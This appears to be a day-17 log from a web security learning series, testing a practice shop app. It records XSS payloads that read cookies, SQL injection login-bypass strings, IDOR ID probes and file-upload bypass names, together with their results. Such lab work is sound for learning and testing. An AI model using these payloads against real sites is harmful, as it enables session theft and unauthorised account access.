# 🧪 Day 17 — Deep Testing

## 📌 Objective

- Perform advanced testing on confirmed vulnerabilities using bypass techniques, edge cases, and parameter manipulation.

---

## 🔥 XSS — Advanced Exploitation

### Payloads Tested

* `<img src=x onerror=alert(document.cookie)>`
* `<img src=x onerror=fetch('/rest/basket/1')>`

### Result

* Arbitrary JavaScript execution confirmed
* Able to access application endpoints via injected script
* Indicates potential for session/token abuse

---

## 🔥 IDOR — Edge Case Analysis

### Endpoints Tested

* `/rest/basket/0`
* `/rest/basket/-1`
* `/rest/basket/9999`
* `/rest/basket/abc`

### Result

* Invalid IDs return no data (304 response)
* Valid IDs allow unauthorized access
* No ownership validation present

---

## 🔥 Authentication — SQL Injection Depth

### Payloads Tested

* `admin' OR '1'='1`
* `' OR 1=1#`
* `admin'--`

### Result

* Only specific payload (`admin' OR 1=1--`) works
* Indicates partial filtering or query constraints
* Authentication bypass remains critical

---

## 🔥 Parameter Manipulation

### Tests Performed

* `role=admin`
* `user_id=1`
* `debug=true`

### Result

* No change in application behavior
* Backend ignores unknown parameters

---

## 🟡 File Upload — Edge Case Testing

### Tests Performed

* `test.php%00.jpg`
* `test.jpg.`
* `test .jpg`
* `test..jpg`

## Result

* All bypass attempts blocked
* Strong validation and sanitization present

---

# 🧠 Key Takeaways

* XSS allows full JavaScript execution and API interaction
* IDOR exists but limited to valid resources
* SQL Injection is present but partially constrained
* Upload functionality is well protected
* Backend parameter validation is effective
